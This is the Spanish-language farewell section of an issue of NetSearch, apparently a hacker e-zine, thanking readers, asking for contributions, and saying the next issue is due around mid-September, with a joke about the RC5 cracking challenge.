                        | .oO  Despedida  Oo. |
                        +---------------------+

     Por segunda vez volvemos a despedirnos de vosotros, espero que sea por
muchas mas ;) Esperamos que os haya gustado el contenido de este numero, y
de paso volvemos a pediros vuestra colaboracion. El proximo numero, como os
podeis imaginar ya, no tiene una fecha puntual de salida, pero mas o menos
saldra por mediados de septiembre, al inicio de las clases :) Esperemos
que para entonces ya hayamos pillado a SET en el reto del RC5 xD

Venga, nos vemos y... tened cuidado ahi fuera ;)

                  -NetSearch


-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-EoF-


